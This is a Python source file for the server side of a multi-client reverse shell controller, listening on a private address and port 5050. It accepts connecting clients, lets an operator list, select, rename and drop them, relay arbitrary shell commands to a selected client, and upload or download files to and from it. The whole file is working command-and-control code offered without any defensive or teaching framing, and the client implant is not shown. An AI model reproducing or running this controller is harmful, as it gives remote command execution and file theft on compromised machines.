import threading
import socket
import queue
from _queue import Empty
import tqdm
import os


class DeleteError(Exception):
    pass


class PathError(Exception):
    pass


class Tools:
    @staticmethod
    def number_to_bytes(num):
        buf = []
        while num:
            buf.append(num & 0xff)
            num >>= 8
        return buf

    # ... | data[2]<<16 | data[1]<<8 | data[0]
    @staticmethod
    def bytes_to_number(*data, param=0, num=0):
        if len(data):
            return Tools.bytes_to_number(*data[1:], param=param | (data[0] << (8*num)), num=num + 1)
        else:
            return param


class Server:
    CLIENT_MAX_NUMBER = 5

    def __init__(self, _host, _port):
        # first access to the  socket
        # implement threads and queue
        # start kernel

        # variable and arrays
        self.functions = [self.connection_handler, self.interactive_shell_handler]
        self.host = _host
        self.port = _port
        self.threads = []
        self.clients = []
        self.semaphore = threading.Semaphore()
        self.timeout = 5
        try:
            self.queue = queue.Queue()
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # create threads and queues
            for i in range(len(self.functions)):
                self.threads.append(threading.Thread(target=self.run, daemon=True))
                self.queue.put(i)
            print('Initialization completed!')

        except:
            print('Initialization error!')
            raise

    def start(self):

        while 1:
            try:
                # bind the server to a specific port and ip
                self.server.bind((self.host, self.port))
                self.server.listen(Server.CLIENT_MAX_NUMBER)
                print('Server binds on ', self.host, ' :', self.port, 'successfully!')
                break;
            except socket.error as msg:
                print('Socket binding error: ', msg, '\n', 'The system tries again...')

        try:
            for i in self.threads:
                i.start()
            # The server blocks all active threads
            # del self.threads[:]
            self.queue.join()

        except:
            print('Server failed to start!')
            raise

    def run(self, obj=False):
        if obj:
            #print(obj)
            client = obj['o']
            queue_obj = obj['queue']
            auto_handle_event = obj['auto_handle_event']
            try:
                while 1:
                    try:
                        if not auto_handle_event.is_set() and queue_obj.full():
                            raise

                        data_size = Tools.bytes_to_number(*list(client.recv(4)))
                        client.send(b' ')

                        data = client.recv(data_size)
                        client.send(b' ')

                        if auto_handle_event.is_set():
                            self.safe_print(f'\n#Event on {obj["address"]}: {obj["port"]}: ', data.decode())
                        else:
                            queue_obj.put(data)

                    except socket.error as msg:
                        # There may be an error in this area
                        self.safe_print('\n#connection error! ', msg)
                        client.close()
                        for num, data in enumerate(self.clients):
                            if data == obj:
                                del self.clients[num]
                        break

                    except:
                        pass

            except:
                pass

        else:
            self.functions[self.queue.get()]()
            # Indicate that a formerly enqueued task is complete.
            # Used by queue consumer threads. For each get() used to fetch a task,
            # a subsequent call to task_done() tells the queue that the processing on the task is complete.


            # If a join() is currently blocking,
            # it will resume when all items have been processed
            # (meaning that a task_done() call was received for every item that had been put() into the queue).
            self.queue.task_done()

    def connection_handler(self):

        for i in range(len(self.clients)):
            self.clients.pop().close()

        while 1:

            try:
                #print('a')
                # the server waits to accept new connections
                obj = self.server.accept()
                # prevent connections timeout
                obj[0].settimeout(None)
                #print('b')
                #for num, data in enumerate(self.functions):
                    #if not data == self.connection_handler:
                        #self.threads[num]._stop()

                self.safe_print(f'\n##############new client on {obj[1][0]}:{obj[1][1]}##############')
                name = 'client' + str(len(self.clients))
                while 1:
                    if len(list(filter(lambda element: (element['name'] == name), self.clients))):
                        name += str(len(self.clients))
                    else:
                        break

                obj = {'name':  name,
                       'o': obj[0],
                       'address': obj[1][0],
                       'port': obj[1][1],
                       'thread': None,
                       'queue': queue.Queue(maxsize=1),
                       'auto_handle_event': threading.Event()}
                obj['thread'] = threading.Thread(target=self.run, daemon=True, args=(obj,))
                self.auto_handle_config()
                obj['thread'].start()
                self.clients.append(obj)


            except socket.error as msg:
                self.safe_print('error on accepting connection!', msg)

    def interactive_shell_handler(self):
        while 1:

            while len(self.clients):
                try:
                    # auto handle ONN
                    self.auto_handle_config()

                    raise_flag = True
                    inp = self.safe_input('server>').strip().lower()
                    # instruction 'ls':
                    # list of active clients
                    if inp == 'ls':
                        self.safe_print('^^^^^^^clients^^^^^^^')

                        for num, obj in enumerate(self.clients):
                            self.safe_print(f'{num}- {obj["name"]}: address: {obj["address"]}:{obj["port"]}')

                        self.safe_print('To select a client use "sel [CLIENT_NAME]" isntruction')

                    # select active client in reverse shell mode(normal mode) or terminal mode
                    # instruction 'sel [CLIENT_NAME]':
                    # with --terminal-mode or -t you can open new window in terminal mode
                    # it selects an active client
                    # you can see list of active clients with 'ls' instruction
                    elif not inp.find('sel '):
                        inp = inp.replace('sel ', '', 1).split(' ')
                        #print(inp)
                        inp = list(map(lambda x:  x.strip(), inp))
                        #print(inp)
                        if len(inp) == 1:
                            obj = list(filter(lambda element: (element['name'] == inp[0]), self.clients))[0]
                            self.reverse_shell_handle(obj)
                        elif inp[0] == '--terminal-mode' or inp[0] == '-t':
                            obj = list(filter(lambda element: (element['name'] == inp[1]), self.clients))[0]
                            # Using kivy, a new view is presented in this section


                    # instruction 'del [CLIENT_NAME]':
                    # it deletes active clients
                    # if you want to delete all active clients just enter 'del -a'
                    # you can see list of active clients with 'ls' instruction
                    elif not inp.find('del '):

                        inp = inp.replace('del', '', 1).strip()
                        if inp == '-a':
                            print('# Ok')
                            for i in self.clients:
                                self.clients.pop()['o'].close()
                            raise_flag = False

                        for num, data in enumerate(self.clients):
                            if data['name'] == inp:
                                del self.clients[num]
                                raise_flag = False
                        if raise_flag:
                            raise DeleteError('#DeleteError: please try again')

                    # instruction 'rename [Current CLIENT_NAME] [NEW CLIENT_NAME]':
                    # change client name
                    elif not inp.find('rename '):
                        inp = list(map(str.strip, inp.replace('rename ', '', 1).strip().split(' ')))
                        obj = list(filter(lambda element: (element['name'] == inp[0]), self.clients))[0]
                        obj['name'] = inp[1]

                    # you can set default timeout in server comminucations
                    elif not inp.find('timeout '):
                        inp = list(map(str.strip, inp.replace('timeout ', '', 1).strip().split(' ')))

                        if len(inp) == 1:
                            try:
                                inp = float(inp[0])
                            except ValueError:
                                raise
                            self.timeout = inp

                    else:
                        pass

                except DeleteError as msg:
                    print(msg)

                except:
                    self.safe_print('instruction is not defined')
                    raise

    def reverse_shell_handle(self, obj):

        # convert dictionary to list()(faster)
        # obj = [x for x in obj.values()]
        self.safe_print(f'^^^^^^^{obj["name"]} reverse shell handler^^^^^^^\n', '^^^^^^^enter "self.break" to exit^^^^^^^')
        self.safe_print(f'{obj["address"]} >', end='')
        data = " "
        client = obj['o']
        queue = obj['queue']
        try:
            while len(self.clients):

                data = self.safe_input().strip()

                if 'self.' in data:

                    data = data.replace('self.', '', 1)
                    data_tmp = list(map(str.strip, data.split(' ')))
                    if not len(data_tmp):
                        raise

                    elif data_tmp[0] == 'break':
                        break
                    # _______________________________________________________________________________________________
                    # self.upload "[source_path/file_address_server]" "[destination_path_client]"
                    elif data_tmp[0] == 'upload':

                        data = list(map(str.strip, data.replace('upload', '', 1).split('"')))
                        # data[0] source path
                        # data[1] destination path
                        data = list(filter(lambda x: x and not x == ' ', data))

                        # The user must enter the source file address and destination location correctly.
                        if not len(data) == 2:
                            raise
                        # The source file address is checked here
                        file_size = os.path.getsize(data[0])
                        file = open(data[0], "rb")
                        data_tmp = self.safe_input('the file ready to send press yes/y to continue: ').strip().lower()

                        if not (data_tmp == 'y' or data_tmp == 'yes'):
                            raise PathError(f'WARNING: operation terminated!')

                        # The automatic socket controller must be deactivated before accessing the client
                        self.auto_handle_config(flag=False, client_name=obj["name"])
                        # sending self.download [file_size] [file_name/source_path] to client
                        client.send(f'self.download "{file_size}" "{data[1]}"'.encode())

                        # receiving act 'ready' message from client
                        if queue.get(timeout=self.timeout).decode() == 'ready':
                            # start sending the file
                            progress = tqdm.tqdm(range(file_size), f"uploading {data[1]} to {data[0]}", unit="B", unit_scale=True,
                                                 unit_divisor=1024)

                            while 1:
                                data_tmp = file.read(1048576)
                                if not data_tmp:
                                    progress.close()
                                    break
                                client.sendall(data_tmp)
                                progress.update(len(data_tmp))
                            file.close()

                        else:
                            file.close()
                            self.auto_handle_config(flag=True, client_name=obj["name"])
                            raise PathError(f'ERROR: Invalid operation')

                        self.auto_handle_config(flag=True, client_name=obj["name"])
                    # _________________________________________________________________________________________________
                    # self.download [file_address_client] [destination_path_server]
                    elif data_tmp[0] == 'download':
                        data = list(map(str.strip, data.replace('download', '', 1).split('"')))
                        # data[0] file address on client
                        # data[1] destination path on server
                        data = list(filter(lambda x: x and not x == ' ', data))

                        # The user must enter the source file address and destination location correctly.
                        if not len(data) == 2:
                            raise
                        # The source file address is checked here
                        f = open(data[1], "wb")

                        # get size of dest file on client
                        data_tmp = self.safe_input(f'the file {data[0]} ready to download press yes/y to continue: ').strip().lower()

                        if not (data_tmp == 'y' or data_tmp == 'yes'):
                            raise PathError(f'#WARNING: operation terminated!')

                        # The automatic socket controller must be deactivated before accessing the client
                        self.auto_handle_config(flag=False, client_name=obj["name"])
                        # sending self.upload  [file_name/source_path] to client
                        client.send(f'self.upload "{data[0]}"'.encode())

                        # receiving act 'ready' message from client
                        if queue.get(timeout=self.timeout).decode() == 'ready':
                            # getting file size
                            file_size = int(queue.get(timeout=self.timeout).decode())

                            if not file_size:
                                raise PathError(f'ERROR: file size is zero!')

                            # start downloading the file
                            progress = tqdm.tqdm(range(file_size), f"downloading {data[0]}", unit="B",
                                                 unit_scale=True,
                                                 unit_divisor=1024)
                            data = 0
                            while 1:
                                if data >= file_size:
                                    progress.close()
                                    break
                                data_tmp = queue.get(timeout=self.timeout)
                                data_tmp = f.write(data_tmp)
                                progress.update(data_tmp)
                                data += data_tmp

                            f.close()
                        else:
                            f.close()
                            self.auto_handle_config(flag=True, client_name=obj["name"])
                            raise PathError(f'ERROR: Invalid operation')

                        self.auto_handle_config(flag=True, client_name=obj["name"])

                elif len(data):
                    self.auto_handle_config(flag=False, client_name=obj["name"])

                    client.send(str.encode(data))

                    # receiving data
                    self.safe_print(queue.get(self.timeout).decode())# timeout=1
                    # receiving path
                    self.safe_print(queue.get(self.timeout).decode())

                    self.auto_handle_config(flag=True, client_name=obj["name"])

        except socket.error as msg:
            self.safe_print('#connection error! ', msg)
            client.close()
            for num, data in enumerate(self.clients):
                if data == obj:
                    del self.clients[num]
                    break

        except FileNotFoundError as msg:
            print('#ERROR! The File Not Found', msg)

        except PathError as msg:
            print(msg)

        except Empty:
            self.safe_print('#Timeout Error! please check destination address')
        except:
            self.safe_print('instruction is not defined')
            raise

    def safe_input(self, *args, **kwargs):
        self.semaphore.acquire()
        res = input(*args, **kwargs)
        self.semaphore.release()
        return res

    def safe_print(self, *args, **kwargs):
        self.semaphore.acquire(timeout=1)
        print(*args, **kwargs)
        self.semaphore.release()

    # client_name can get numeric values(index of client in self.clients) or alphabetical values(the names of clients)
    # if client_name == None then the result applies on all of the clients
    # if the value of 'flag' is equal to True then the auto_handle functionality will be activated.
    def auto_handle_config(self, flag=True, client_name=None):
        _set = lambda x: x.set()
        _clear = lambda x: x.clear()
        buf = [_clear, _set]
        clients = list(map(lambda x: (x['name'], x['auto_handle_event']), self.clients))

        if None == client_name:
            for i in clients:
                buf[flag](i[1])

        elif type(client_name) == int:
            buf[flag](clients[client_name][1])

        elif type(client_name) == str:
            for i in clients:
                if i[0] == client_name:
                    buf[flag](i[1])
                    break

####################################################################
PORT = 5050
SERVER = '192.168.137.1'
print(socket.gethostname() + ' ip address is ', SERVER)

if __name__ == "__main__":
    serv = Server(SERVER, PORT)
    serv.start()
